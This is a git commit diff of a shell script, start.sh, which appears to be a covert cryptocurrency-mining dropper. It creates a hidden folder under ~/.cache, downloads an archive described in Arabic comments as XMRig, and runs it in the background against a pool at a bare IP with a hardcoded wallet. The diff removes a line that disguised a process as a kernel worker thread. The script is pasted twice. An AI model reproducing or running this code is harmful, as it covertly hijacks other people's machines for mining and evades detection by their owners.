aeb33c80fe57ab19b8eaa8d679faea294a8a94a0
ewilkinso <ewilkinson3@alaska.edu>
2025-08-14 23:00:32 +0100

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,39 +1,41 @@
 #!/bin/bash
 
-nohup python3 -c 'import time,os,sys;sys.argv[0]="[kworker/0:1-events]";[time.sleep(0.5) for _ in iter(int,1)]' >/dev/null 2>&1 &
-
+# إعداد بيانات المحفظة والمعدّن
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
 WORKER="dandidgreen"
 POOL="45.155.102.89:443"
 THREADS=
-
-WORKDIR="$HOME/.cache/.sysd"
+# مجلد العمل
+WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
+# تحميل النسخة الجاهزة من XMRig (Linux x64)
 wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
 
+# فك الضغط
 tar -xvf scala.tar.gz --strip=1
 rm scala.tar.gz
 
+# تشغيل المعدّن في الخلفية باستخدام nohup
 nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
 
 #!/bin/bash
 
-nohup python3 -c 'import time,os,sys;sys.argv[0]="[kworker/0:1-events]";[time.sleep(0.5) for _ in iter(int,1)]' >/dev/null 2>&1 &
-
+# إعداد بيانات المحفظة والمعدّن
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
 WORKER="dandidgreen1"
 POOL="45.155.102.89:443"
 THREADS=
-
-WORKDIR="$HOME/.cache/.sysd"
+# مجلد العمل
+WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
 
+# تحميل النسخة الجاهزة من XMRig (Linux x64)
 wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz
 
+# فك الضغط
 tar -xvf scala.tar.gz --strip=1
 rm scala.tar.gz
 
+# تشغيل المعدّن في الخلفية باستخدام nohup
 nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS > cpu_output.log 2>&1 &
-
-
